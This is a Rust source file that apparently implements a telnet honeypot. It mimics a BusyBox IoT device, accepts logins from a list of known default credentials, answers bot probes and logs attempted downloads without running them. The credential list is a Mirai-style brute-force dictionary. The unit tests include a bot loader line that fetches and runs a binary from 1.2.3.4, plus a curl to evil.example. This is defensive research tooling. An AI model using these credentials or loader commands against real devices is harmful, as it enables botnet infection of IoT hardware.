// SPDX-License-Identifier: GPL-3.0-only
//! The fake telnet devices of ports 23 and 2323: a BusyBox device's login,
//! then a shell that answers what IoT bots type (the `/bin/busybox <WORD>`
//! probe, `cat /proc/cpuinfo`, `uname`, `echo -ne` writes) and says yes to
//! `wget`, `curl`, `tftp` and `ftpget` without fetching anything. Nothing
//! runs: the shell only answers, and logs every line.
use super::{
    log::{Download, Line, Login, MAX_LINES, printable},
    services::{RunView, Services, SessionId, now_ms},
    stand_in,
};
use crate::route::config::TelnetLogins;
use std::{
    collections::BTreeMap,
    io::{Read, Write},
    os::unix::net::UnixStream,
    sync::Arc,
    time::{Duration, Instant},
};

const IDLE: Duration = Duration::from_secs(60);
/// Logins one connection may try before it is hung up.
const MAX_LOGINS: usize = 10;
const PROMPT: &str = "~ # ";
const BANNER: &str =
    "\r\n\r\nBusyBox v1.31.1 (2020-03-18 10:21:05 CST) built-in shell (ash)\r\n\r\n";

/// The logins IoT devices ship with, as bot dictionaries list them.
const DEFAULT_LOGINS: &[(&str, &str)] = &[
    ("root", "xc3511"),
    ("root", "vizxv"),
    ("root", "admin"),
    ("admin", "admin"),
    ("root", "888888"),
    ("root", "xmhdipc"),
    ("root", "default"),
    ("root", "juantech"),
    ("root", "123456"),
    ("root", "54321"),
    ("support", "support"),
    ("root", ""),
    ("admin", "password"),
    ("root", "root"),
    ("root", "12345"),
    ("user", "user"),
    ("admin", ""),
    ("root", "pass"),
    ("admin", "admin1234"),
    ("root", "1111"),
    ("admin", "smcadmin"),
    ("admin", "1111"),
    ("root", "666666"),
    ("root", "password"),
    ("root", "1234"),
    ("root", "klv123"),
    ("Administrator", "admin"),
    ("service", "service"),
    ("supervisor", "supervisor"),
    ("guest", "guest"),
    ("guest", "12345"),
    ("admin1", "password"),
    ("administrator", "1234"),
    ("666666", "666666"),
    ("888888", "888888"),
    ("ubnt", "ubnt"),
    ("root", "klv1234"),
    ("root", "Zte521"),
    ("root", "hi3518"),
    ("root", "jvbzd"),
    ("root", "anko"),
    ("root", "zlxx."),
    ("root", "7ujMko0vizxv"),
    ("root", "7ujMko0admin"),
    ("root", "system"),
    ("root", "ikwb"),
    ("root", "dreambox"),
    ("root", "user"),
    ("root", "realtek"),
    ("root", "00000000"),
    ("admin", "1234"),
    ("admin", "12345"),
    ("admin", "54321"),
    ("admin", "123456"),
    ("admin", "7ujMko0admin"),
    ("admin", "pass"),
    ("admin", "meinsm"),
    ("tech", "tech"),
];

/// The applets the fake BusyBox has; any other `busybox WORD` is "applet not
/// found", which is what Mirai's probe looks for.
const APPLETS: &[&str] = &[
    "ash", "cat", "chmod", "chown", "cp", "dd", "df", "echo", "free", "ftpget", "ftpput", "grep",
    "head", "hostname", "id", "ifconfig", "kill", "killall", "ln", "ls", "mkdir", "mount", "mv",
    "nc", "netstat", "nproc", "ping", "ps", "reboot", "rm", "route", "sh", "sleep", "tail",
    "telnet", "tftp", "touch", "true", "false", "uname", "uptime", "wc", "wget", "whoami",
];

/// One file of the fake device's file system.
struct FakeFile {
    bytes: Vec<u8>,
    /// What a download pretended to get; `None` for a file written by `echo`.
    served: Option<String>,
}

struct Shell<'a> {
    services: &'a Services,
    view: RunView,
    id: SessionId,
    files: BTreeMap<String, FakeFile>,
    /// Bytes the files hold, kept under the session's byte limit.
    stored: u64,
    out: Vec<u8>,
    closed: bool,
}

/// The guest's bytes as lines: telnet commands (IAC ...) dropped, a line
/// ending at CR or LF (CR LF and CR NUL count once).
struct Lines {
    pending: Vec<u8>,
    line: Vec<u8>,
    iac: u8,
    last_cr: bool,
}

impl Lines {
    fn new() -> Self {
        Self {
            pending: Vec::new(),
            line: Vec::new(),
            iac: 0,
            last_cr: false,
        }
    }

    /// Feeds bytes; returns the complete lines.
    fn feed(&mut self, bytes: &[u8]) -> Vec<Vec<u8>> {
        self.pending.extend_from_slice(bytes);
        let mut out = Vec::new();
        for byte in std::mem::take(&mut self.pending) {
            match (self.iac, byte) {
                // IAC: the next byte is a command; WILL/WONT/DO/DONT have an
                // option byte after it; SB runs to IAC SE.
                (0, 255) => self.iac = 1,
                (1, 251..=254) => self.iac = 2,
                (1, 250) => self.iac = 3,
                (1, _) | (2, _) => self.iac = 0,
                (3, 255) => self.iac = 4,
                (3, _) => {}
                (4, 240) => self.iac = 0,
                (4, _) => self.iac = 3,
                (_, b'\r') | (_, b'\n') => {
                    if !(byte == b'\n' && self.last_cr) {
                        out.push(std::mem::take(&mut self.line));
                    }
                    self.last_cr = byte == b'\r';
                    continue;
                }
                (_, 0) => {}
                (_, b) => {
                    if self.line.len() < 64 * 1024 {
                        self.line.push(b);
                    }
                }
            }
            self.last_cr = false;
        }
        out
    }
}

/// Serves one telnet connection to `endpoint`.
pub(super) fn serve(services: Arc<Services>, stream: UnixStream, endpoint: String) {
    let view = services.view();
    let Some(id) = services.open_session("telnet", endpoint) else {
        return;
    };
    let deadline = Instant::now() + Duration::from_secs(view.options.session_seconds);
    let limit = view.options.session_bytes;
    let mut shell = Shell {
        services: &services,
        view,
        id,
        files: BTreeMap::new(),
        stored: 0,
        out: Vec::new(),
        closed: false,
    };
    let mut writer = &stream;
    let mut reader = &stream;
    let mut lines = Lines::new();
    let mut logins: Vec<Login> = Vec::new();
    let mut user: Option<String> = None;
    let mut logged_in = false;
    let mut bytes = 0u64;
    let mut buffer = [0u8; 4096];
    let ended = 'session: {
        if writer.write_all(b"\r\nlogin: ").is_err() {
            break 'session "closed by the guest";
        }
        loop {
            let left = deadline.saturating_duration_since(Instant::now());
            if left.is_zero() {
                break 'session "time limit";
            }
            let _ = stream.set_read_timeout(Some(left.min(IDLE)));
            let read = match reader.read(&mut buffer) {
                Ok(0) => break 'session "closed by the guest",
                Ok(n) => n,
                Err(e)
                    if matches!(
                        e.kind(),
                        std::io::ErrorKind::WouldBlock | std::io::ErrorKind::TimedOut
                    ) =>
                {
                    if Instant::now() >= deadline {
                        break 'session "time limit";
                    }
                    break 'session "idle";
                }
                Err(_) => break 'session "closed by the guest",
            };
            bytes += read as u64;
            if bytes > limit {
                break 'session "byte limit";
            }
            for raw in lines.feed(&buffer[..read]) {
                let text = printable(&raw);
                if !logged_in {
                    match user.take() {
                        None => {
                            user = Some(text);
                            shell.out.extend_from_slice(b"Password: ");
                        }
                        Some(name) => {
                            let accepted = match shell.view.options.telnet_logins {
                                TelnetLogins::Any => true,
                                TelnetLogins::Defaults => {
                                    DEFAULT_LOGINS.iter().any(|(u, p)| *u == name && *p == text)
                                }
                            };
                            logins.push(Login {
                                user: name,
                                password: text,
                                accepted,
                            });
                            let tried = logins.clone();
                            shell.services.update(shell.id, |s| s.logins = tried);
                            if accepted {
                                logged_in = true;
                                shell.out.extend_from_slice(BANNER.as_bytes());
                                shell.out.extend_from_slice(PROMPT.as_bytes());
                            } else if logins.len() >= MAX_LOGINS {
                                let _ = writer.write_all(b"\r\nLogin incorrect\r\n");
                                break 'session "too many failed logins";
                            } else {
                                shell
                                    .out
                                    .extend_from_slice(b"\r\nLogin incorrect\r\nlogin: ");
                            }
                        }
                    }
                } else {
                    let ms = now_ms();
                    shell.services.update(shell.id, |s| {
                        if s.lines.len() < MAX_LINES {
                            s.lines.push(Line {
                                ms,
                                text: text.clone(),
                            });
                        } else {
                            s.lines_omitted += 1;
                        }
                    });
                    shell.run_line(&raw);
                    if shell.closed {
                        let _ = writer.write_all(&shell.out);
                        break 'session "logged out";
                    }
                    shell.out.extend_from_slice(PROMPT.as_bytes());
                }
            }
            if writer.write_all(&std::mem::take(&mut shell.out)).is_err() {
                break 'session "closed by the guest";
            }
        }
    };
    shell.finish(ended, bytes);
}

impl Shell<'_> {
    fn say(&mut self, text: &str) {
        self.out
            .extend_from_slice(text.replace('\n', "\r\n").as_bytes());
    }

    fn finish(self, ended: &str, bytes: u64) {
        let generation = self.view.generation;
        let written: Vec<_> = self
            .files
            .iter()
            .filter(|(_, file)| file.served.is_none())
            .map(|(name, file)| self.services.keep_written(generation, name, &file.bytes))
            .collect();
        let end = now_ms();
        self.services.update(self.id, |s| {
            s.end_ms = end;
            s.bytes = bytes;
            s.ended = ended.into();
            s.written = written;
        });
    }

    fn run_line(&mut self, raw: &[u8]) {
        let text = String::from_utf8_lossy(raw).into_owned();
        for command in parse(&text) {
            if self.closed {
                return;
            }
            self.run(command);
        }
    }

    fn store(&mut self, name: &str, bytes: Vec<u8>, served: Option<String>, append: bool) {
        let name = file_name(name);
        if name.is_empty() {
            return;
        }
        let old = self.files.get(&name).map_or(0, |f| f.bytes.len() as u64);
        let mut file = match (append, self.files.remove(&name)) {
            (true, Some(file)) => file,
            _ => FakeFile {
                bytes: Vec::new(),
                served: None,
            },
        };
        self.stored = self.stored.saturating_sub(old);
        let room = self
            .view
            .options
            .session_bytes
            .saturating_sub(self.stored + file.bytes.len() as u64) as usize;
        file.bytes
            .extend_from_slice(&bytes[..bytes.len().min(room)]);
        if served.is_some() {
            file.served = served;
        }
        self.stored += file.bytes.len() as u64;
        self.files.insert(name, file);
    }

    fn run(&mut self, command: Command) {
        let mut args = command.args;
        if args.is_empty() {
            return;
        }
        let mut name = args[0].rsplit('/').next().unwrap_or("").to_owned();
        if name == "busybox" {
            if args.len() == 1 {
                self.say("BusyBox v1.31.1 (2020-03-18 10:21:05 CST) multi-call binary.\n");
                return;
            }
            args.remove(0);
            name = args[0].clone();
            if !APPLETS.contains(&name.as_str()) {
                self.say(&format!("{name}: applet not found\n"));
                return;
            }
        }
        let arch = self.view.arch;
        match name.as_str() {
            "enable" | "system" | "shell" | "linuxshell" | "start" | "sh" | "ash" | "bash"
            | "config" | "terminal" | "cd" | "export" | "ulimit" | "chmod" | "chown" | "kill"
            | "killall" | "pkill" | "sleep" | "true" | "mkdir" | "touch" | "sync" | "ln"
            | "mount" | "iptables" | "ifconfig" | "route" | ":" => {}
            "exit" | "logout" | "quit" => self.closed = true,
            "false" => {}
            "rm" => {
                for arg in args.iter().skip(1).filter(|a| !a.starts_with('-')) {
                    if let Some(old) = self.files.remove(&file_name(arg)) {
                        self.stored = self.stored.saturating_sub(old.bytes.len() as u64);
                    }
                }
            }
            "cp" | "mv" => {
                let paths: Vec<&String> = args.iter().skip(1).filter(|a| !a.starts_with('-')).collect();
                if let [from, to] = paths[..] {
                    if let Some(file) = self.files.get(&file_name(from)) {
                        let (bytes, served) = (file.bytes.clone(), file.served.clone());
                        if name == "mv" {
                            self.files.remove(&file_name(from));
                        }
                        self.store(to, bytes, served, false);
                    }
                }
            }
            "echo" => self.echo(&args, command.output),
            "cat" => self.cat(&args, command.output),
            "uname" => {
                let machine = machine_name(arch);
                let text = match args.get(1).map(String::as_str) {
                    Some("-a") => format!("Linux localhost 3.10.14 #1 SMP PREEMPT {machine} GNU/Linux\n"),
                    Some("-m") => format!("{machine}\n"),
                    Some("-r") => "3.10.14\n".into(),
                    Some("-n") => "localhost\n".into(),
                    _ => "Linux\n".into(),
                };
                self.say(&text);
            }
            "nproc" => self.say("1\n"),
            "whoami" => self.say("root\n"),
            "id" => self.say("uid=0(root) gid=0(root)\n"),
            "hostname" => self.say("localhost\n"),
            "uptime" => self.say(" 00:13:37 up 3 days,  2:01,  load average: 0.00, 0.01, 0.05\n"),
            "ps" => self.say(
                "  PID USER       VSZ STAT COMMAND\n    1 root      1684 S    init\n  402 root      1688 S    /usr/sbin/telnetd\n  417 root      1692 S    -sh\n",
            ),
            "ls" => {
                let names: Vec<String> = self.files.keys().cloned().collect();
                self.say(&format!("{}\n", names.join("  ")));
            }
            "wget" | "curl" | "tftp" | "ftpget" | "ftpput" => self.download(&name, &args, command.output),
            _ => {
                let file = file_name(&args[0]);
                if let Some(found) = self.files.get(&file) {
                    let what = found
                        .served
                        .clone()
                        .unwrap_or_else(|| "a file the session wrote with echo".into());
                    let entry = format!("{} ({what})", args.join(" "));
                    self.services.update(self.id, |s| {
                        if s.executed.len() < 256 {
                            s.executed.push(entry);
                        }
                    });
                } else {
                    self.say(&format!("-sh: {}: not found\n", args[0]));
                }
            }
        }
    }

    fn echo(&mut self, args: &[String], output: Option<(String, bool)>) {
        let (mut newline, mut escapes) = (true, false);
        let mut words = Vec::new();
        let mut flags = true;
        for arg in &args[1..] {
            if flags
                && arg.len() > 1
                && arg.starts_with('-')
                && arg[1..].chars().all(|c| "neE".contains(c))
            {
                newline &= !arg.contains('n');
                escapes |= arg.contains('e');
                continue;
            }
            flags = false;
            words.push(arg.as_str());
        }
        let text = words.join(" ");
        let mut bytes = if escapes {
            unescape(&text)
        } else {
            text.into_bytes()
        };
        if newline {
            bytes.push(b'\n');
        }
        match output {
            Some((path, append)) => self.store(&path, bytes, None, append),
            None => self.say(&String::from_utf8_lossy(&bytes)),
        }
    }

    fn cat(&mut self, args: &[String], output: Option<(String, bool)>) {
        let mut all = Vec::new();
        for path in args.iter().skip(1).filter(|a| !a.starts_with('-')) {
            let arch = self.view.arch;
            let found: Option<Vec<u8>> = match path.as_str() {
                "/proc/cpuinfo" => Some(cpuinfo(arch).into_bytes()),
                "/proc/mounts" => Some(MOUNTS.as_bytes().to_vec()),
                "/proc/version" => {
                    Some(b"Linux version 3.10.14 (root@localhost) #1 SMP PREEMPT\n".to_vec())
                }
                // Bots read a system program's ELF header for the architecture.
                "/bin/echo" | "/bin/busybox" | "/bin/sh" | "/bin/ls" => {
                    stand_in::program(arch).map(|(bytes, _)| bytes)
                }
                _ => self.files.get(&file_name(path)).map(|f| f.bytes.clone()),
            };
            match found {
                Some(bytes) => all.extend_from_slice(&bytes),
                None => self.say(&format!(
                    "cat: can't open '{path}': No such file or directory\n"
                )),
            }
        }
        match output {
            Some((path, append)) => self.store(&path, all, None, append),
            None if all.contains(&0) || all.starts_with(b"\x7fELF") => {
                self.out.extend_from_slice(&all)
            }
            None => self.say(&String::from_utf8_lossy(&all)),
        }
    }

    fn download(&mut self, tool: &str, args: &[String], output: Option<(String, bool)>) {
        let Some(asked) = DownloadArgs::parse(tool, &args[1..]) else {
            self.say(&format!("Usage: {tool} ...\n"));
            return;
        };
        let (bytes, served) = if tool == "ftpput" || asked.put {
            (Vec::new(), String::new())
        } else {
            stand_in::serve(&asked.name, self.view.arch, self.view.options.stand_ins)
        };
        let saved_as = output
            .as_ref()
            .map(|(path, _)| path.clone())
            .or(asked.local.clone())
            .unwrap_or_else(|| file_name(&asked.name));
        let entry = Download {
            ms: now_ms(),
            tool: tool.into(),
            url: asked.url.clone(),
            host: asked.host.clone(),
            port: asked.port,
            name: asked.name.clone(),
            saved_as: if served.is_empty() {
                String::new()
            } else {
                saved_as.clone()
            },
            served: served.clone(),
        };
        self.services.update(self.id, |s| {
            if s.downloads.len() < 1024 {
                s.downloads.push(entry);
            }
        });
        if served.is_empty() {
            return;
        }
        let size = bytes.len();
        let to_stdout = asked.stdout && output.is_none();
        if tool == "wget" {
            self.say(&format!(
                "Connecting to {} ({}:{})\nsaving to '{saved_as}'\n{saved_as}          100% |*******************************|   {size}  0:00:00 ETA\n'{saved_as}' saved\n",
                asked.host, asked.host, asked.port
            ));
        }
        if to_stdout {
            if !bytes.starts_with(b"\x7fELF") {
                self.say(&String::from_utf8_lossy(&bytes));
            }
        } else {
            self.store(&saved_as, bytes, Some(served), false);
        }
    }
}

/// What a download command asked for.
#[derive(Debug, Default, PartialEq, Eq)]
struct DownloadArgs {
    url: String,
    host: String,
    port: u16,
    name: String,
    local: Option<String>,
    /// The content goes to standard output (`curl URL`, `wget -O-`).
    stdout: bool,
    /// An upload (`tftp -p`, `tftp -c put`).
    put: bool,
}

impl DownloadArgs {
    fn parse(tool: &str, args: &[String]) -> Option<Self> {
        let mut out = DownloadArgs::default();
        let mut positional = Vec::new();
        let mut i = 0;
        let value = |i: &mut usize| -> Option<String> {
            *i += 1;
            args.get(*i).cloned()
        };
        while i < args.len() {
            let arg = args[i].as_str();
            match (tool, arg) {
                ("wget", "-O") | ("curl", "-o") => match value(&mut i)?.as_str() {
                    "-" => out.stdout = true,
                    local => out.local = Some(local.into()),
                },
                ("wget", a) if a.starts_with("-O") && a.len() > 2 => {
                    if &a[2..] == "-" {
                        out.stdout = true;
                    } else {
                        out.local = Some(a[2..].into());
                    }
                }
                ("wget", "-P" | "-U" | "-T" | "-t" | "--user-agent" | "-Y")
                | ("curl", "-A" | "-H" | "-m" | "-u" | "-X" | "-d" | "--user-agent")
                | ("ftpget" | "ftpput", "-u" | "-p")
                | ("tftp", "-b") => {
                    value(&mut i)?;
                }
                ("ftpget" | "ftpput", "-P") => out.port = value(&mut i)?.parse().ok()?,
                ("tftp", "-r") => out.name = value(&mut i)?,
                ("tftp", "-l") => out.local = Some(value(&mut i)?),
                ("tftp", "-g") => {}
                ("tftp", "-p") => out.put = true,
                ("tftp", "-c") => {
                    let verb = value(&mut i)?;
                    out.put = verb == "put";
                    out.name = value(&mut i)?;
                }
                (_, a) if a.starts_with('-') && a.len() > 1 => {}
                (_, a) => positional.push(a.to_owned()),
            }
            i += 1;
        }
        match tool {
            "wget" | "curl" => {
                let url = positional
                    .into_iter()
                    .find(|p| p.contains('.') || p.contains("://"))?;
                let full = if url.contains("://") {
                    url
                } else {
                    format!("http://{url}")
                };
                let (scheme, rest) = full.split_once("://")?;
                let (authority, path) = match rest.find('/') {
                    Some(at) => (&rest[..at], &rest[at..]),
                    None => (rest, "/"),
                };
                let authority = authority.rsplit('@').next().unwrap_or(authority);
                let default = if scheme.eq_ignore_ascii_case("https") {
                    443
                } else if scheme.eq_ignore_ascii_case("ftp") {
                    21
                } else {
                    80
                };
                let (host, port) = match authority.rsplit_once(':') {
                    Some((h, p)) => (h, p.parse().unwrap_or(default)),
                    None => (authority, default),
                };
                out.host = host.into();
                out.port = port;
                out.name = path.into();
                out.stdout |=
                    tool == "curl" && out.local.is_none() && !args.iter().any(|a| a == "-O");
                out.url = format!("{}://{}{}", scheme.to_ascii_lowercase(), authority, path);
            }
            "tftp" => {
                let mut rest = positional.into_iter();
                out.host = rest.next()?;
                out.port = rest.next().and_then(|p| p.parse().ok()).unwrap_or(69);
                if out.name.is_empty() {
                    out.name = out.local.clone()?;
                }
                out.url = format!("tftp://{}/{}", out.host, out.name.trim_start_matches('/'));
            }
            _ => {
                // ftpget HOST [LOCAL] REMOTE
                let mut rest = positional.into_iter();
                out.host = rest.next()?;
                let first = rest.next()?;
                match rest.next() {
                    Some(remote) => {
                        out.local = Some(first);
                        out.name = remote;
                    }
                    None => out.name = first,
                }
                if out.port == 0 {
                    out.port = 21;
                }
                out.put = tool == "ftpput";
                out.url = format!("ftp://{}/{}", out.host, out.name.trim_start_matches('/'));
            }
        }
        Some(out)
    }
}

/// A file's name in the fake file system: its last path part.
fn file_name(path: &str) -> String {
    path.rsplit('/').next().unwrap_or("").to_owned()
}

fn machine_name(arch: crate::api::GuestArch) -> &'static str {
    match (arch.machine, arch.class) {
        (62, _) => "x86_64",
        (183, _) => "aarch64",
        (3, _) => "i686",
        (40, _) => "armv7l",
        (8, _) => "mips",
        _ => "unknown",
    }
}

fn cpuinfo(arch: crate::api::GuestArch) -> String {
    match arch.machine {
        62 | 3 => "processor\t: 0\nvendor_id\t: GenuineIntel\nmodel name\t: Intel(R) Atom(TM) CPU D525 @ 1.80GHz\ncpu MHz\t\t: 1800.000\nflags\t\t: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr\n\n".into(),
        183 => "processor\t: 0\nBogoMIPS\t: 48.00\nFeatures\t: fp asimd evtstrm crc32 cpuid\nCPU implementer\t: 0x41\nCPU architecture: 8\nCPU part\t: 0xd03\n\n".into(),
        40 => "processor\t: 0\nmodel name\t: ARMv7 Processor rev 5 (v7l)\nBogoMIPS\t: 38.40\nFeatures\t: half thumb fastmult vfp edsp neon vfpv3 tls vfpv4\nCPU architecture: 7\nHardware\t: hi3518\n\n".into(),
        8 => "system type\t\t: MT7621\nprocessor\t\t: 0\ncpu model\t\t: MIPS 1004Kc V2.15\nBogoMIPS\t\t: 586.13\n\n".into(),
        _ => "processor\t: 0\n\n".into(),
    }
}

const MOUNTS: &str = "rootfs / rootfs rw 0 0\n/dev/root / squashfs ro,relatime 0 0\nproc /proc proc rw,relatime 0 0\nsysfs /sys sysfs rw,relatime 0 0\ntmpfs /tmp tmpfs rw,relatime 0 0\ntmpfs /var tmpfs rw,relatime 0 0\ntmpfs /dev tmpfs rw,relatime,mode=755 0 0\n/dev/mtdblock4 /mnt/mtd jffs2 rw,relatime 0 0\n";

/// `echo -e`'s escapes: `\xHH`, `\0NNN`, `\n`, `\t`, `\r`, `\\` and the rest.
fn unescape(text: &str) -> Vec<u8> {
    let bytes = text.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] != b'\\' || i + 1 == bytes.len() {
            out.push(bytes[i]);
            i += 1;
            continue;
        }
        let next = bytes[i + 1];
        i += 2;
        match next {
            b'x' => {
                let digits: Vec<u8> = bytes[i..]
                    .iter()
                    .take(2)
                    .take_while(|b| b.is_ascii_hexdigit())
                    .copied()
                    .collect();
                if digits.is_empty() {
                    out.extend_from_slice(b"\\x");
                } else {
                    i += digits.len();
                    out.push(
                        u8::from_str_radix(std::str::from_utf8(&digits).unwrap_or("0"), 16)
                            .unwrap_or(0),
                    );
                }
            }
            b'0'..=b'7' => {
                let start = if next == b'0' { i } else { i - 1 };
                let digits: Vec<u8> = bytes[start..]
                    .iter()
                    .take(3)
                    .take_while(|b| (b'0'..=b'7').contains(b))
                    .copied()
                    .collect();
                i = start + digits.len();
                let value = u32::from_str_radix(std::str::from_utf8(&digits).unwrap_or("0"), 8)
                    .unwrap_or(0);
                out.push(value as u8);
            }
            b'n' => out.push(b'\n'),
            b't' => out.push(b'\t'),
            b'r' => out.push(b'\r'),
            b'a' => out.push(7),
            b'b' => out.push(8),
            b'f' => out.push(12),
            b'v' => out.push(11),
            b'e' => out.push(27),
            b'\\' => out.push(b'\\'),
            b'c' => break,
            other => out.extend_from_slice(&[b'\\', other]),
        }
    }
    out
}

/// One simple command of a line, with where its output goes.
#[derive(Debug, Default, PartialEq, Eq)]
struct Command {
    args: Vec<String>,
    /// `> file` or `>> file` (true: append).
    output: Option<(String, bool)>,
}

/// A shell line as simple commands: words split on blanks, quotes and
/// backslashes as the shell reads them, commands split on `;`, `&&`, `||`,
/// `|` and `&`, and `>`/`>>` redirections taken out (others are dropped).
fn parse(line: &str) -> Vec<Command> {
    let mut commands = Vec::new();
    let mut current = Command::default();
    let mut word = String::new();
    let mut in_word = false;
    let mut redirect: Option<(bool, bool)> = None; // (append, to a file)
    let chars: Vec<char> = line.chars().collect();
    let mut i = 0;
    let end_word = |word: &mut String,
                    in_word: &mut bool,
                    current: &mut Command,
                    redirect: &mut Option<(bool, bool)>| {
        if !*in_word {
            return;
        }
        let text = std::mem::take(word);
        *in_word = false;
        match redirect.take() {
            Some((append, true)) => current.output = Some((text, append)),
            Some((_, false)) => {}
            None => current.args.push(text),
        }
    };
    while i < chars.len() {
        let c = chars[i];
        match c {
            '\'' => {
                in_word = true;
                i += 1;
                while i < chars.len() && chars[i] != '\'' {
                    word.push(chars[i]);
                    i += 1;
                }
            }
            '"' => {
                in_word = true;
                i += 1;
                while i < chars.len() && chars[i] != '"' {
                    if chars[i] == '\\' && i + 1 < chars.len() && "$`\"\\".contains(chars[i + 1]) {
                        i += 1;
                    }
                    word.push(chars[i]);
                    i += 1;
                }
            }
            '\\' => {
                in_word = true;
                if i + 1 < chars.len() {
                    i += 1;
                    word.push(chars[i]);
                }
            }
            ' ' | '\t' => end_word(&mut word, &mut in_word, &mut current, &mut redirect),
            ';' | '&' | '|' => {
                end_word(&mut word, &mut in_word, &mut current, &mut redirect);
                commands.push(std::mem::take(&mut current));
                while i + 1 < chars.len() && (chars[i + 1] == c) {
                    i += 1;
                }
            }
            '>' | '<' => {
                // `2>` and `2>&1`: the digit before it is no word.
                let to_stderr = in_word && word == "2";
                if to_stderr {
                    word.clear();
                    in_word = false;
                } else {
                    end_word(&mut word, &mut in_word, &mut current, &mut redirect);
                }
                let append = c == '>' && i + 1 < chars.len() && chars[i + 1] == '>';
                if append {
                    i += 1;
                }
                if i + 1 < chars.len() && chars[i + 1] == '&' {
                    // `>&1`: skip the descriptor.
                    i += 1;
                    while i + 1 < chars.len() && chars[i + 1].is_ascii_digit() {
                        i += 1;
                    }
                } else {
                    redirect = Some((append, c == '>' && !to_stderr));
                }
            }
            _ => {
                in_word = true;
                word.push(c);
            }
        }
        i += 1;
    }
    end_word(&mut word, &mut in_word, &mut current, &mut redirect);
    commands.push(current);
    commands.retain(|command| !command.args.is_empty());
    commands
}

#[cfg(test)]
mod tests {
    use super::*;

    fn args(list: &[&str]) -> Vec<String> {
        list.iter().map(|s| s.to_string()).collect()
    }

    #[test]
    fn lines_drop_telnet_commands_and_end_at_cr_or_lf() {
        let mut lines = Lines::new();
        let out = lines.feed(b"\xff\xfb\x01\xff\xfa\x18\x00xterm\xff\xf0root\r\0pass\r\nsh\n");
        assert_eq!(
            out,
            vec![b"root".to_vec(), b"pass".to_vec(), b"sh".to_vec()]
        );
        assert!(lines.feed(b"par").is_empty());
        assert_eq!(lines.feed(b"tial\n"), vec![b"partial".to_vec()]);
    }

    #[test]
    fn a_loader_line_parses_into_commands_with_redirections() {
        let commands = parse(
            "cd /tmp || cd /var/run; wget http://1.2.3.4/bins/x.arm7 -O .x; chmod 777 .x && ./.x telnet 2>&1 >/dev/null & echo -ne \"\\x7fELF\" >> .d",
        );
        let words: Vec<Vec<String>> = commands.iter().map(|c| c.args.clone()).collect();
        assert_eq!(
            words,
            vec![
                args(&["cd", "/tmp"]),
                args(&["cd", "/var/run"]),
                args(&["wget", "http://1.2.3.4/bins/x.arm7", "-O", ".x"]),
                args(&["chmod", "777", ".x"]),
                args(&["./.x", "telnet"]),
                args(&["echo", "-ne", "\\x7fELF"]),
            ]
        );
        assert_eq!(commands[4].output, Some(("/dev/null".into(), false)));
        assert_eq!(commands[5].output, Some((".d".into(), true)));
        assert_eq!(
            parse("echo 'a b' c\\ d")[0].args,
            args(&["echo", "a b", "c d"])
        );
    }

    #[test]
    fn echo_escapes_decode_like_busybox() {
        assert_eq!(
            unescape("\\x7f\\x45LF\\n\\0101\\\\"),
            b"\x7fELF\nA\\".to_vec()
        );
        assert_eq!(unescape("a\\cb"), b"a".to_vec());
        assert_eq!(unescape("\\xZ"), b"\\xZ".to_vec());
    }

    #[test]
    fn download_commands_name_their_url_host_and_file() {
        let w = DownloadArgs::parse(
            "wget",
            &args(&["http://1.2.3.4:8080/bins/x.mips", "-O", "y"]),
        )
        .unwrap();
        assert_eq!(
            (w.host.as_str(), w.port, w.name.as_str(), w.local.as_deref()),
            ("1.2.3.4", 8080, "/bins/x.mips", Some("y"))
        );
        assert_eq!(w.url, "http://1.2.3.4:8080/bins/x.mips");
        let c = DownloadArgs::parse("curl", &args(&["-s", "evil.example/bins.sh"])).unwrap();
        assert!(c.stdout && c.url == "http://evil.example/bins.sh");
        let t = DownloadArgs::parse("tftp", &args(&["-g", "-r", "t.arm", "5.6.7.8"])).unwrap();
        assert_eq!((t.url.as_str(), t.port), ("tftp://5.6.7.8/t.arm", 69));
        let t2 = DownloadArgs::parse("tftp", &args(&["5.6.7.8", "-c", "get", "t.mpsl"])).unwrap();
        assert_eq!(t2.url, "tftp://5.6.7.8/t.mpsl");
        let f = DownloadArgs::parse(
            "ftpget",
            &args(&["-u", "a", "-p", "b", "9.9.9.9", "l", "/pub/f.x86"]),
        )
        .unwrap();
        assert_eq!(
            (f.url.as_str(), f.local.as_deref()),
            ("ftp://9.9.9.9/pub/f.x86", Some("l"))
        );
        assert!(DownloadArgs::parse("wget", &args(&["-q"])).is_none());
    }
}
